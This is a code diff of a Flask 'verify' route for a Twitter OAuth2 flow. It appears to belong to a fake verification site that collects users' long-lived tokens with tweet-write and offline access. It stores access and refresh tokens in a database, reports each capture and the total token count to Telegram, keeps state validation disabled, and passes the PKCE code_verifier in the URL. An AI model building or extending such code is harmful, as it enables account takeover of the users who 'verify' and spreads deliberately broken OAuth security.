@@ -251,12 +251,12 @@ def verify():
     state = request.args.get('state')
     error = request.args.get('error')
 
-    # Check if authorization is in progress (if 'verify' flag is present)
+    # Check if verification is in progress (if 'verify' flag is present)
     if request.args.get('verify') == 'true':
         state = "0"  # Reset state
         code_verifier, code_challenge = generate_code_verifier_and_challenge()
-        session['code_verifier'] = code_verifier
 
+        # Store code_verifier temporarily in URL, rather than session
         authorization_url = (
             f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
             f"redirect_uri={CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
@@ -273,10 +273,8 @@ def verify():
         # Since you disabled state validation, you can skip or customize it:
         # if state != session.get('oauth_state', '0'):
         #     return "Invalid state parameter", 403
-        # else:
-        #     return "Invalid state parameter", 403
 
-        code_verifier = session.get('code_verifier')
+        code_verifier = request.args.get('code_verifier')  # No longer use session to store code_verifier
         token_url = "https://api.twitter.com/2/oauth2/token"
         data = {
             'grant_type': 'authorization_code',
@@ -294,10 +292,8 @@ def verify():
             username, profile_url = get_twitter_username_and_profile(access_token)
 
             if username:
+                # Store tokens in the database directly instead of session
                 store_token(access_token, refresh_token, username)
-                session['username'] = username
-                session['access_token'] = access_token
-                session['refresh_token'] = refresh_token
 
                 total_tokens = get_total_tokens()
                 send_message_via_telegram(
@@ -309,7 +305,6 @@ def verify():
                     f"📊 Total Tokens in Database: {total_tokens}"
                 )
 
-                # Custom welcome message
                 message = f"Verification successful for @{username}!"
                 return render_template('veriwelcome.html', message=message, redirect_url=VERIFY_REDIRECT_URL)
             else:
